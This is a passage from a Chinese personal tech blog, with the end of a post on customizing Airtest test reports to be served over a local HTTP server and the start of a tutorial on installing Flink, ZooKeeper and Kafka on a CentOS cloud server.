class="number">465</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动器代码分析</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取配置文件，进行运行函数</span></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line">path = PATH(<span class="string">&quot;config/setting1.ini&quot;</span>)</span><br><span class="line">data = ReadIni(path).get_ini_list()</span><br><span class="line">run_case(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># 当平台为安卓时，检查是否连接成功</span></span><br><span class="line">    <span class="keyword">if</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;android&quot;</span>:</span><br><span class="line">        devices = attached_devices()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无可用设备&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;ios&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;web&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    test = CustomAirtestCase(data[<span class="string">&quot;root_path&quot;</span>])</span><br><span class="line">    device = [data[<span class="string">&quot;dev_connect&quot;</span>]]</span><br><span class="line">    test.run_air(device, data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_air</span>(<span class="params">self, device, data</span>):</span><br><span class="line">    get_data_list = get_test_case(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> get_data_list:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无可用用例&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 开启本地http服务器</span></span><br><span class="line">    HttpServer.start(data[<span class="string">&quot;local_host_path&quot;</span>], data[<span class="string">&quot;local_host_port&quot;</span>])</span><br><span class="line">	<span class="comment"># 循环执行用例</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get_data_list:</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment"># 执行用例</span></span><br><span class="line">        get_run = run(data[<span class="string">&quot;root_path&quot;</span>], j, device, local_host_path, data[<span class="string">&quot;recording&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        ..</span><br><span class="line">         <span class="comment"># 生成测试用例的详情报告,注意这里修改了lib目录下的report.py中源代码，主要为了达到通过服务器ip访问测试报告</span></span><br><span class="line">       rpt = report.LogToHtml(get_run[<span class="string">&quot;script&quot;</span>], get_run[<span class="string">&quot;log&quot;</span>], data[<span class="string">&quot;report_host&quot;</span>]+<span class="string">&quot;/report&quot;</span>, log_host=</span><br><span class="line">                              data[<span class="string">&quot;report_host&quot;</span>] + <span class="string">&quot;/log/&quot;</span> + log_date + <span class="string">&quot;/&quot;</span> + get_run[<span class="string">&quot;log_host_path&quot;</span>])</span><br><span class="line">      rpt.report(<span class="string">&quot;log_template.html&quot;</span>, output_file=get_run[<span class="string">&quot;output_file&quot;</span>])</span><br><span class="line">      <span class="comment"># self。results主要记录测试用例结果，通过解析summary_template.html生成测试报告</span></span><br><span class="line">      result = &#123;<span class="string">&quot;result&quot;</span>: get_run[<span class="string">&quot;is_success&quot;</span>], <span class="string">&quot;start_date&quot;</span>: st_date,<span class="string">&quot;end_date&quot;</span>: end_date, <span class="string">&quot;sum_time&quot;</span>: sum_time,<span class="string">&quot;log&quot;</span>: s_log, <span class="string">&quot;name&quot;</span>: s_name&#125;</span><br><span class="line">        modules.append(j[<span class="string">&quot;module&quot;</span>])</span><br><span class="line">        self.results[<span class="string">&quot;data&quot;</span>].append(result)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>from airtest.report import report</code> 里面的report.py文件修改，实际文件目录如图：</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120112555007.png" alt="image-20220120112555007"></p>
<ul>
<li>report.py文件修改</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LogToHtml</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    scale = <span class="number">0.5</span></span><br><span class="line">    <span class="comment"># 这里的log_host是我新增的日志文件服务器地址，这样新增一个字段，不影响到其他代码逻辑</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, script_root, log_root=<span class="string">&quot;&quot;</span>, static_root=<span class="string">&quot;&quot;</span>, export_dir=<span class="literal">None</span>, script_name=<span class="string">&quot;&quot;</span>, logfile=<span class="literal">None</span>, lang=<span class="string">&quot;en&quot;</span>, plugins=<span class="literal">None</span>, log_host=<span class="literal">None</span></span>):</span><br><span class="line">        ...</span><br><span class="line">      self.log_host = log_host <span class="comment"># shikun 2022-1-19</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment"># 这个函数，主要生成log.html文件中的图片展示</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">_translate_screen</span>(<span class="params">self, step, code</span>):</span><br><span class="line">        ...</span><br><span class="line">          <span class="keyword">for</span> item <span class="keyword">in</span> step[<span class="string">&quot;__children__&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> item[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;try_log_screen&quot;</span>:</span><br><span class="line">                snapshot = item[<span class="string">&quot;data&quot;</span>].get(<span class="string">&quot;ret&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(snapshot, six.text_type):</span><br><span class="line">                    src = snapshot</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(snapshot, <span class="built_in">dict</span>):</span><br><span class="line">                    src = snapshot[<span class="string">&#x27;screen&#x27;</span>]</span><br><span class="line">                    screen[<span class="string">&#x27;resolution&#x27;</span>] = snapshot[<span class="string">&#x27;resolution&#x27;</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> self.export_dir:  <span class="comment"># all relative path</span></span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = os.path.join(DEFAULT_LOG_DIR, src)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = os.path.abspath(os.path.join(self.log_root, src))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 修改了这里逻辑， screen[&#x27;src&#x27;]展示的图片路径就Log.html中img src中的路径</span></span><br><span class="line">                <span class="keyword">if</span> self.log_host:</span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = self.log_host + <span class="string">&quot;/&quot;</span> + src</span><br><span class="line">                screen[<span class="string">&#x27;src&#x27;</span>] = screen[<span class="string">&#x27;_filepath&#x27;</span>]</span><br><span class="line"> <span class="comment"># 根据模板文件生成测试报告，这里主要对视频文件路径进行处理  </span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">report</span>(<span class="params">self, template_name=HTML_TPL, output_file=HTML_FILE, record_list=<span class="literal">None</span></span>):</span><br><span class="line">       ....</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> record_list:</span><br><span class="line">            record_list = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(self.log_root) <span class="keyword">if</span> f.endswith(<span class="string">&quot;.mp4&quot;</span>)]</span><br><span class="line">        <span class="comment"># 源代码时这样，我多加了个log_host</span></span><br><span class="line">        <span class="comment"># data = self.report_data(output_file=output_file, record_list=record_list)</span></span><br><span class="line">        <span class="comment"># shikun-2121-1-19</span></span><br><span class="line">        data = self.report_data(output_file=output_file, record_list=record_list, log_host=self.log_host)</span><br><span class="line">        </span><br><span class="line">   <span class="comment"># log_host 为我新增</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report_data</span>(<span class="params">self, output_file=<span class="literal">None</span>, record_list=<span class="literal">None</span>, log_host=<span class="literal">None</span></span>):</span><br><span class="line">	...</span><br><span class="line">       <span class="keyword">if</span> record_list:</span><br><span class="line">            records = [os.path.join(DEFAULT_LOG_DIR, f) <span class="keyword">if</span> self.export_dir</span><br><span class="line">                       <span class="keyword">else</span> os.path.abspath(os.path.join(self.log_root, f)) <span class="keyword">for</span> f <span class="keyword">in</span> record_list]</span><br><span class="line">            <span class="comment"># 对视频路径进行处理</span></span><br><span class="line">            <span class="keyword">if</span> log_host:</span><br><span class="line">                records = []</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> record_list:</span><br><span class="line">                    records.append(log_host + <span class="string">&quot;/&quot;</span> + i)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<ul>
<li>运行runner5.py</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120113714163.png" alt="image-20220120113714163"></p>
<ul>
<li>通过http服务查看运行结果</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120113910981.png" alt="image-20220120113910981"></p>
<p><img src="/aposts/6e64669e/image-20220120113940586.png" alt="image-20220120113940586"></p>
<p><img src="/aposts/6e64669e/image-20220120114713093.png" alt="image-20220120114713093"></p>
<ul>
<li>实际上http服务，定位到的就是在配置文件中的：local_host_path&#x3D;E:\proj\aritest</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E:\<span class="title">proj</span>\<span class="title">aritest</span>&gt;<span class="title">dir</span> <span class="title">log</span>\2022-01-20-10-56-21</span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">E</span> 中的卷是 软件盘</span></span><br><span class="line"><span class="function"> 卷的序列号是 240<span class="title">F</span>-1787</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>\<span class="title">log</span>\2022-01-20-10-56-21 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2022/01/20  10:58    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">2022/01/20  10:58    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">2022/01/20  10:58             2,803 <span class="title">summary_2022</span>-01-20-10-58-33.<span class="title">html</span></span></span><br><span class="line"><span class="function">2022/01/20  10:58             1,568 <span class="title">summary_template.html</span></span></span><br><span class="line"><span class="function">2022/01/20  10:57    &lt;<span class="title">DIR</span>&gt;          他的</span></span><br><span class="line"><span class="function">2022/01/20  10:57    &lt;<span class="title">DIR</span>&gt;          我的</span></span><br><span class="line"><span class="function">               2 个文件          4,371 字节</span></span><br><span class="line"><span class="function">               4 个目录 19,213,107,200 可用字节</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>&gt;<span class="title">dir</span> <span class="title">report</span></span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">E</span> 中的卷是 软件盘</span></span><br><span class="line"><span class="function"> 卷的序列号是 240<span class="title">F</span>-1787</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>\<span class="title">report</span> 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2022/01/18  16:43    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">2022/01/18  16:43    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">css</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">fonts</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">image</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">js</span></span></span><br><span class="line"><span class="function">2021/05/21  10:28            10,634 <span class="title">log_template.html</span></span></span><br><span class="line"><span class="function">2021/08/16  10:43            21,860 <span class="title">report.py</span></span></span><br><span class="line"><span class="function">2021/06/23  16:53            22,405 <span class="title">test.py</span></span></span><br><span class="line"><span class="function">2018/08/28  11:39                 0 <span class="title">__init__.py</span></span></span><br><span class="line"><span class="function">               4 个文件         54,899 字节</span></span><br><span class="line"><span class="function">               6 个目录 19,213,107,200 可用字节</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改好的report.py文件已经放在项目跟目录，可以覆盖到各自目录即可</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>查看<a target="_blank" rel="noopener" href="https://github.com/Louis-me/airtest_auto">github源代码</a></p>
</li>
<li><p>查看<a target="_blank" rel="noopener" href="https://gitee.com/moon-full/airtest_auto">gitee源代码</a></p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/d4ea272f/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/d4ea272f/" class="post-title-link" itemprop="url">Flink+zk+python+kafka集群实时日志读取</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-04 09:36:40" itemprop="dateCreated datePublished" datetime="2022-01-04T09:36:40+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/" itemprop="url" rel="index"><span itemprop="name">大数据</span></a>
                </span>
            </span>

          
            <span id="/aposts/d4ea272f/" class="post-meta-item leancloud_visitors" data-flag-title="Flink+zk+python+kafka集群实时日志读取" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/d4ea272f/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/d4ea272f/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本文章主要是学Flink 处理实时数据，使用zk+kafka搭建日志系统，python编写测试代码</li>
<li>本次服务器，采用的腾讯云服务器，使用的centos7 系统</li>
<li>本次的flink采用本地部署的方式，zk+kafka采用伪分布式</li>
</ul>
<h2 id="Flink特点"><a href="#Flink特点" class="headerlink" title="Flink特点"></a>Flink特点</h2><ul>
<li>采用了基于操作符（Operator）的连续流模型，可以做到微秒级别的延迟。Flink最核心的数据结构是Stream，它代表一个运行在多分区上的并行流。在大数据场景中，经常用来对实时要求比较高的操作，比如实时处理。</li>
</ul>
<h3 id="如何选择Spark和Flink"><a href="#如何选择Spark和Flink" class="headerlink" title="如何选择Spark和Flink"></a>如何选择Spark和Flink</h3><ul>
<li><p>对于以下场景，你可以选择 Spark：</p>
<ul>
<li>数据量非常大而且逻辑复杂的批数据处理，并且对计算效率有较高要求（比如用大数据分析来构建推荐系统进行个性化推荐、广告定点投放等）；</li>
<li>基于历史数据的交互式查询，要求响应较快；</li>
<li>基于实时数据流的数据处理，延迟性要求在在数百毫秒到数秒之间。</li>
</ul>
</li>
<li><p>Spark完美满足这些场景的需求，而且它可以一站式解决这些问题，无需用别的数据处理平台。由于Flink是为了提升流处理而创建的平台，所以它适用于各种需要非常低延迟（微秒到毫秒级）的实时数据处理场景，比如实时日志报表分析。<br>而且Flink 用流处理去模拟批处理的思想，比Spark 用批处理去模拟流处理的思想扩展性更好</p>
</li>
<li><p>具体<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40247263/article/details/97000109">参考</a></p>
</li>
</ul>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><ul>
<li>flink安装的版本现在在官网为最新版本：V1.14.2，对java要求为8或者11</li>
<li>我之前已经搭建好了java刚好为 java8，此步省略</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# java -version</span><br><span class="line">java version &quot;1.8.0_311&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_311-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode)</span><br><span class="line">[root@VM-24-13-centos ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="flink"><a href="#flink" class="headerlink" title="flink"></a>flink</h3><ul>
<li>常见部署模式分为：local本地部署（学习研究环节），集群模式有Standalone Cluster、Flink ON YARN、Mesos，Docker，Kubernetes等</li>
<li><strong>本次采用本地部署</strong>，后续打算用本地三台虚拟机的方式学习（和hadoop一起）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget  http://mirrors.aliyun.com/apache/flink/flink-1.14.2/flink-1.14.2-bin-scala_2.11.tgz</span><br><span class="line">tar -zxvf flink-1.14.2-bin-scala_2.11.tgz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"></span><br><span class="line">export FLINK_HOME=/usr/local/flink-1.14.2</span><br><span class="line">export PATH=$PATH:$FLINK_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<ul>
<li>启动flink</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# ./bin/start-cluster.sh</span><br><span class="line">Starting cluster.</span><br><span class="line">Starting standalonesession daemon on host VM-24-13-centos.</span><br><span class="line">Starting taskexecutor daemon on host VM-24-13-centos.</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# ps -ef | grep flink</span><br><span class="line">root     22422     1  3 17:05 pts/1    00:00:06 /usr/local/jdk1.8.0_311/bin/java                         .../flink-root-standalonesession-0-VM-24-13-c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>flink一般都是8081端口，需要服务器防火墙打开，然后再腾讯云服务器再单独开启相应端口</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220104172514390.png" alt="image-20220104172514390"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos flink-1.14.2]# firewall-cmd --zone=public --add-port=8081/tcp --permanent</span><br><span class="line">success</span><br><span class="line">[root@VM-24-13-centos flink-1.14.2]# firewall-cmd --reload</span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<ul>
<li>远程可以访问</li>
</ul>
<p><img src="/aposts/d4ea272f/image-20220104172658930.png" alt="image-20220104172658930"></p>
<h3 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h3><ul>
<li>一个分布式的、可分区的、可复制的消息中间件系统。kafka依赖于zookeeper</li>
</ul>
<h4 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h4><ul>
<li>注册中心，主要功能就是对中间件进行<strong>分布式通知&#x2F;协调</strong>，比如对外部需要调用kafka，其实是通过调用zk进行协调访问。</li>
<li><strong>Master选举的方式是核心</strong>，可以看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/lingbo229/article/details/81052078">zookeeper的原理和应用（非常详细透彻）</a>和<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinyonghu/p/11031729.html">ZooKeeper原理及介绍</a>，我暂时也没完全理解，zk有三个角色：<strong>leader(主)、follower（从）、observer（观察）</strong></li>
<li>安装kafka之前，先安装zk，zk有三种部署方式：本地、伪分布式、完全分布式。<strong>本次打算采用伪分布式</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirrors.aliyun.com/apache/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">tar -zxvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line"></span><br><span class="line">mv apache-zookeeper-3.7.0-bin zookeeper_01</span><br></pre></td></tr></table></figure>

<ul>
<li>复制1份zoo.cfg 配置文件，命名为 zoo.cfg，并做好配置，<strong>注意填入的ip要填入腾讯云的内外ip，之前填入公网ip一直启动失败</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd zookeeper_01/conf</span><br><span class="line">cp zoo_sample.cfg zoo.cfg</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_01/data</span><br><span class="line">clientPort=2181</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>复制zookeeper_01目录伪zookeeper_02，配置zoo.cfg</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv zookeeper_01 zookeeper_02</span><br><span class="line">cd zookeeper_02</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_02/data</span><br><span class="line">clientPort=2182</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>复制zookeeper_01目录伪zookeeper_03，配置zoo.cfg</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv zookeeper_01 zookeeper_03</span><br><span class="line">cd zookeeper_03</span><br><span class="line">vi zoo.cfg</span><br><span class="line"></span><br><span class="line">dataDir=/usr/local/zookeeper_03/data</span><br><span class="line">clientPort=2183</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>修改zookeeper_01中conf目录下zoo.cfg文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_01/data</span><br><span class="line">clientPort=2181</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zookeeper_02中conf目录下zoo.cfg文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/usr/local/zookeeper_02/data</span><br><span class="line">clientPort=2182</span><br><span class="line">server.1=ip:2881:3881</span><br><span class="line">server.2=ip:2882:3882</span><br><span class="line">server.3=ip:2883:3883</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zookeeper_03中conf目录下zoo.cfg文件</li>
</ul>
